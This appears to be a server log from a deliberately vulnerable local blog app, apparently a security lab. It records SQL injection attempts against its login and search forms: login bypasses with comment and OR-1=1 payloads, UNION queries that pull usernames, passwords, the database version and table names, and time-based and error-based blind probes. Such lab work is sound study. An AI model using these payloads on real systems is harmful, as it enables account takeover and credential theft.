+18.12.2024, 14:28:08 [info]: [validateAndUpdateSession] Session updated successfully: ID=49914e08-48bf-493d-95d2-c0e4a915c443
+18.12.2024, 14:28:09 [info]: [getUser] Retrieved username: admin for session ID: 49914e08-48bf-493d-95d2-c0e4a915c443
+18.12.2024, 14:28:10 [info]: [validateAndUpdateSession] Session updated successfully: ID=49914e08-48bf-493d-95d2-c0e4a915c443
+18.12.2024, 14:28:10 [info]: [session_test] Session valid for sessionID=49914e08-48bf-493d-95d2-c0e4a915c443
+18.12.2024, 14:28:14 [info]: [validateAndUpdateSession] Session updated successfully: ID=49914e08-48bf-493d-95d2-c0e4a915c443
+18.12.2024, 14:28:15 [info]: [getUser] Retrieved username: admin for session ID: 49914e08-48bf-493d-95d2-c0e4a915c443
+18.12.2024, 14:28:19 [info]: [validateAndUpdateSession] Session updated successfully: ID=49914e08-48bf-493d-95d2-c0e4a915c443
+18.12.2024, 14:28:19 [info]: [getUser] Retrieved username: admin for session ID: 49914e08-48bf-493d-95d2-c0e4a915c443
+18.12.2024, 14:28:22 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%a%'
+        
+18.12.2024, 14:28:22 [info]: [unsafe_searchPosts] Query executed successfully, returned 3 result(s)
+18.12.2024, 14:28:24 [info]: [validateAndUpdateSession] Session updated successfully: ID=49914e08-48bf-493d-95d2-c0e4a915c443
+18.12.2024, 14:28:24 [info]: [getUser] Retrieved username: admin for session ID: 49914e08-48bf-493d-95d2-c0e4a915c443
+18.12.2024, 14:28:26 [info]: [validateAndUpdateSession] Session updated successfully: ID=49914e08-48bf-493d-95d2-c0e4a915c443
+18.12.2024, 14:28:26 [info]: [deleteSession] Session deleted: ID=49914e08-48bf-493d-95d2-c0e4a915c443
+18.12.2024, 14:28:26 [info]: [logout] Session deleted successfully: sessionID=49914e08-48bf-493d-95d2-c0e4a915c443
+18.12.2024, 14:45:15 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 14:45:15 [info]: [validateLogin] Login successful: username=' OR 1/(SUBSTRING(username, 1, 1) = 'a') -- 
+18.12.2024, 14:45:15 [info]: [generateUUID] Generated UUID: eddb1a06-29ae-4946-82a8-d92fbe6dfb28
+18.12.2024, 14:45:15 [info]: [generateSession] Starting session creation for user: ' OR 1/(SUBSTRING(username, 1, 1) = 'a') -- 
+18.12.2024, 14:45:15 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 14:45:16 [info]: [generateSession] Session created: ID=eddb1a06-29ae-4946-82a8-d92fbe6dfb28, user=' OR 1/(SUBSTRING(username, 1, 1) = 'a') -- 
+18.12.2024, 14:45:16 [info]: [login] Login successful: username=' OR 1/(SUBSTRING(username, 1, 1) = 'a') -- , sessionID=eddb1a06-29ae-4946-82a8-d92fbe6dfb28
+18.12.2024, 14:45:16 [info]: [validateAndUpdateSession] Session updated successfully: ID=eddb1a06-29ae-4946-82a8-d92fbe6dfb28
+18.12.2024, 14:45:16 [info]: [getUser] Retrieved username: admin for session ID: eddb1a06-29ae-4946-82a8-d92fbe6dfb28
+18.12.2024, 14:45:19 [info]: [validateAndUpdateSession] Session updated successfully: ID=eddb1a06-29ae-4946-82a8-d92fbe6dfb28
+18.12.2024, 14:45:19 [info]: [deleteSession] Session deleted: ID=eddb1a06-29ae-4946-82a8-d92fbe6dfb28
+18.12.2024, 14:45:19 [info]: [logout] Session deleted successfully: sessionID=eddb1a06-29ae-4946-82a8-d92fbe6dfb28
+18.12.2024, 15:22:42 [info]: Loading route file: route_account_management.js
+18.12.2024, 15:22:42 [info]: Loading route file: route_blog.js
+18.12.2024, 15:22:42 [info]: Loading route file: unsafe_route_account_management.js
+18.12.2024, 15:22:42 [info]: Loading route file: unsafe_route_blog.js
+18.12.2024, 15:22:42 [info]: Server is running on http://localhost:3000
+18.12.2024, 15:22:42 [error]: Fehler beim Überprüfen des Uvicorn-Servers: connect ECONNREFUSED 127.0.0.1:8001
+18.12.2024, 15:22:43 [info]: Database connection established
+18.12.2024, 15:24:33 [info]: [validateLogin] User not found: username=user
+18.12.2024, 15:24:33 [info]: [login] Unauthorized login attempt: username=user
+18.12.2024, 15:24:34 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 15:24:34 [info]: [validateLogin] Login successful: username=admin' -- 
+18.12.2024, 15:24:34 [info]: [generateUUID] Generated UUID: ebed1129-2718-4c04-a487-cf283b66a0a9
+18.12.2024, 15:24:34 [info]: [generateSession] Starting session creation for user: admin' -- 
+18.12.2024, 15:24:35 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 15:24:35 [info]: [generateSession] Session created: ID=ebed1129-2718-4c04-a487-cf283b66a0a9, user=admin' -- 
+18.12.2024, 15:24:35 [info]: [login] Login successful: username=admin' -- , sessionID=ebed1129-2718-4c04-a487-cf283b66a0a9
+18.12.2024, 15:24:35 [info]: [validateLogin] User not found: username=user_xy' -- 
+18.12.2024, 15:24:35 [info]: [login] Unauthorized login attempt: username=user_xy' -- 
+18.12.2024, 15:24:36 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 15:24:36 [info]: [validateLogin] Login successful: username=elvis' -- 
+18.12.2024, 15:24:36 [info]: [generateUUID] Generated UUID: cde9b666-b4a6-4789-ac1b-7b2fc6f31428
+18.12.2024, 15:24:36 [info]: [generateSession] Starting session creation for user: elvis' -- 
+18.12.2024, 15:24:37 [info]: [generateSession] Deleted 0 session(s) for user ID: 11
+18.12.2024, 15:24:37 [info]: [generateSession] Session created: ID=cde9b666-b4a6-4789-ac1b-7b2fc6f31428, user=elvis' -- 
+18.12.2024, 15:24:37 [info]: [login] Login successful: username=elvis' -- , sessionID=cde9b666-b4a6-4789-ac1b-7b2fc6f31428
+18.12.2024, 15:24:37 [info]: [login] Missing username or password
+18.12.2024, 15:25:19 [info]: [validateLogin] User not found: username=user
+18.12.2024, 15:25:19 [info]: [login] Unauthorized login attempt: username=user
+18.12.2024, 15:25:32 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 15:25:32 [info]: [validateLogin] Login successful: username=admin' -- 
+18.12.2024, 15:25:32 [info]: [generateUUID] Generated UUID: f7ac2a10-0273-42b7-a9a5-fc5daca5b5b1
+18.12.2024, 15:25:32 [info]: [generateSession] Starting session creation for user: admin' -- 
+18.12.2024, 15:25:33 [info]: [generateSession] Deleted 1 session(s) for user ID: 9
+18.12.2024, 15:25:33 [info]: [generateSession] Session created: ID=f7ac2a10-0273-42b7-a9a5-fc5daca5b5b1, user=admin' -- 
+18.12.2024, 15:25:33 [info]: [login] Login successful: username=admin' -- , sessionID=f7ac2a10-0273-42b7-a9a5-fc5daca5b5b1
+18.12.2024, 15:25:33 [info]: [validateAndUpdateSession] Session updated successfully: ID=f7ac2a10-0273-42b7-a9a5-fc5daca5b5b1
+18.12.2024, 15:25:34 [info]: [getUser] Retrieved username: admin for session ID: f7ac2a10-0273-42b7-a9a5-fc5daca5b5b1
+18.12.2024, 15:25:38 [info]: [validateAndUpdateSession] Session updated successfully: ID=f7ac2a10-0273-42b7-a9a5-fc5daca5b5b1
+18.12.2024, 15:25:38 [info]: [deleteSession] Session deleted: ID=f7ac2a10-0273-42b7-a9a5-fc5daca5b5b1
+18.12.2024, 15:25:38 [info]: [logout] Session deleted successfully: sessionID=f7ac2a10-0273-42b7-a9a5-fc5daca5b5b1
+18.12.2024, 15:26:49 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 15:26:49 [info]: [validateLogin] Login successful: username=userxy' OR '1'='1' ORDER BY id ASC -- 
+18.12.2024, 15:26:49 [info]: [generateUUID] Generated UUID: 00a528e6-7e40-468b-bd43-8791585b7c7c
+18.12.2024, 15:26:49 [info]: [generateSession] Starting session creation for user: userxy' OR '1'='1' ORDER BY id ASC -- 
+18.12.2024, 15:26:50 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 15:26:50 [info]: [generateSession] Session created: ID=00a528e6-7e40-468b-bd43-8791585b7c7c, user=userxy' OR '1'='1' ORDER BY id ASC -- 
+18.12.2024, 15:26:50 [info]: [login] Login successful: username=userxy' OR '1'='1' ORDER BY id ASC -- , sessionID=00a528e6-7e40-468b-bd43-8791585b7c7c
+18.12.2024, 15:26:51 [info]: [validateAndUpdateSession] Session updated successfully: ID=00a528e6-7e40-468b-bd43-8791585b7c7c
+18.12.2024, 15:26:51 [info]: [getUser] Retrieved username: admin for session ID: 00a528e6-7e40-468b-bd43-8791585b7c7c
+18.12.2024, 15:26:54 [info]: [validateAndUpdateSession] Session updated successfully: ID=00a528e6-7e40-468b-bd43-8791585b7c7c
+18.12.2024, 15:26:54 [info]: [deleteSession] Session deleted: ID=00a528e6-7e40-468b-bd43-8791585b7c7c
+18.12.2024, 15:26:54 [info]: [logout] Session deleted successfully: sessionID=00a528e6-7e40-468b-bd43-8791585b7c7c
+18.12.2024, 15:27:06 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 15:27:06 [info]: [validateLogin] Login successful: username=userxy' OR '1'='1' ORDER BY id DESC -- 
+18.12.2024, 15:27:06 [info]: [generateUUID] Generated UUID: f014e32a-5891-4544-8529-4f4bb04a7f0d
+18.12.2024, 15:27:06 [info]: [generateSession] Starting session creation for user: userxy' OR '1'='1' ORDER BY id DESC -- 
+18.12.2024, 15:27:07 [info]: [generateSession] Deleted 1 session(s) for user ID: 11
+18.12.2024, 15:27:07 [info]: [generateSession] Session created: ID=f014e32a-5891-4544-8529-4f4bb04a7f0d, user=userxy' OR '1'='1' ORDER BY id DESC -- 
+18.12.2024, 15:27:07 [info]: [login] Login successful: username=userxy' OR '1'='1' ORDER BY id DESC -- , sessionID=f014e32a-5891-4544-8529-4f4bb04a7f0d
+18.12.2024, 15:27:07 [info]: [validateAndUpdateSession] Session updated successfully: ID=f014e32a-5891-4544-8529-4f4bb04a7f0d
+18.12.2024, 15:27:08 [info]: [getUser] Retrieved username: elvis for session ID: f014e32a-5891-4544-8529-4f4bb04a7f0d
+18.12.2024, 15:27:18 [info]: [validateAndUpdateSession] Session updated successfully: ID=f014e32a-5891-4544-8529-4f4bb04a7f0d
+18.12.2024, 15:27:19 [info]: [deleteSession] Session deleted: ID=f014e32a-5891-4544-8529-4f4bb04a7f0d
+18.12.2024, 15:27:19 [info]: [logout] Session deleted successfully: sessionID=f014e32a-5891-4544-8529-4f4bb04a7f0d
+18.12.2024, 15:27:51 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 15:27:51 [info]: [validateLogin] Login successful: username=admin
+18.12.2024, 15:27:51 [info]: [generateUUID] Generated UUID: ac2f6b1c-5310-48e8-a50a-3d8e1af2b144
+18.12.2024, 15:27:51 [info]: [generateSession] Starting session creation for user: admin
+18.12.2024, 15:27:52 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 15:27:52 [info]: [generateSession] Session created: ID=ac2f6b1c-5310-48e8-a50a-3d8e1af2b144, user=admin
+18.12.2024, 15:27:52 [info]: [login] Login successful: username=admin, sessionID=ac2f6b1c-5310-48e8-a50a-3d8e1af2b144
+18.12.2024, 15:27:53 [info]: [validateAndUpdateSession] Session updated successfully: ID=ac2f6b1c-5310-48e8-a50a-3d8e1af2b144
+18.12.2024, 15:27:53 [info]: [getUser] Retrieved username: admin for session ID: ac2f6b1c-5310-48e8-a50a-3d8e1af2b144
+18.12.2024, 15:27:59 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%a%'
+        
+18.12.2024, 15:28:00 [info]: [unsafe_searchPosts] Query executed successfully, returned 3 result(s)
+18.12.2024, 15:29:22 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%' UNION SELECT id, username, password FROM users -- %'
+        
+18.12.2024, 15:29:22 [info]: [unsafe_searchPosts] Query executed successfully, returned 6 result(s)
+18.12.2024, 15:30:23 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%' UNION SELECT 1, @@version, 3 -- %'
+        
+18.12.2024, 15:30:23 [info]: [unsafe_searchPosts] Query executed successfully, returned 4 result(s)
+18.12.2024, 15:30:38 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%' UNION SELECT 1, DATABASE(), 3 -- %'
+        
+18.12.2024, 15:30:38 [info]: [unsafe_searchPosts] Query executed successfully, returned 4 result(s)
+18.12.2024, 15:30:48 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%' UNION SELECT 1, table_name, 3 FROM information_schema.tables -- %'
+        
+18.12.2024, 15:30:49 [info]: [unsafe_searchPosts] Query executed successfully, returned 332 result(s)
+18.12.2024, 15:31:21 [info]: [validateAndUpdateSession] Session updated successfully: ID=ac2f6b1c-5310-48e8-a50a-3d8e1af2b144
+18.12.2024, 15:31:21 [info]: [getUser] Retrieved username: admin for session ID: ac2f6b1c-5310-48e8-a50a-3d8e1af2b144
+18.12.2024, 15:31:22 [info]: [validateAndUpdateSession] Session updated successfully: ID=ac2f6b1c-5310-48e8-a50a-3d8e1af2b144
+18.12.2024, 15:31:23 [info]: [deleteSession] Session deleted: ID=ac2f6b1c-5310-48e8-a50a-3d8e1af2b144
+18.12.2024, 15:31:23 [info]: [logout] Session deleted successfully: sessionID=ac2f6b1c-5310-48e8-a50a-3d8e1af2b144
+18.12.2024, 15:32:22 [info]: [validateLogin] User not found: username=' OR IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(3), 0) -- 
+18.12.2024, 15:32:22 [info]: [login] Unauthorized login attempt: username=' OR IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(3), 0) -- 
+18.12.2024, 15:33:27 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 15:33:27 [info]: [validateLogin] Login successful: username=' OR 1/(SUBSTRING(username, 1, 1) = 'a') -- 
+18.12.2024, 15:33:27 [info]: [generateUUID] Generated UUID: 236f47ec-32e3-4af5-9d2c-020838bc732f
+18.12.2024, 15:33:27 [info]: [generateSession] Starting session creation for user: ' OR 1/(SUBSTRING(username, 1, 1) = 'a') -- 
+18.12.2024, 15:33:27 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 15:33:28 [info]: [generateSession] Session created: ID=236f47ec-32e3-4af5-9d2c-020838bc732f, user=' OR 1/(SUBSTRING(username, 1, 1) = 'a') -- 
+18.12.2024, 15:33:28 [info]: [login] Login successful: username=' OR 1/(SUBSTRING(username, 1, 1) = 'a') -- , sessionID=236f47ec-32e3-4af5-9d2c-020838bc732f
+18.12.2024, 15:33:28 [info]: [validateAndUpdateSession] Session updated successfully: ID=236f47ec-32e3-4af5-9d2c-020838bc732f
+18.12.2024, 15:33:29 [info]: [getUser] Retrieved username: admin for session ID: 236f47ec-32e3-4af5-9d2c-020838bc732f
+18.12.2024, 15:33:39 [info]: [validateAndUpdateSession] Session updated successfully: ID=236f47ec-32e3-4af5-9d2c-020838bc732f
+18.12.2024, 15:33:39 [info]: [deleteSession] Session deleted: ID=236f47ec-32e3-4af5-9d2c-020838bc732f
+18.12.2024, 15:33:39 [info]: [logout] Session deleted successfully: sessionID=236f47ec-32e3-4af5-9d2c-020838bc732f
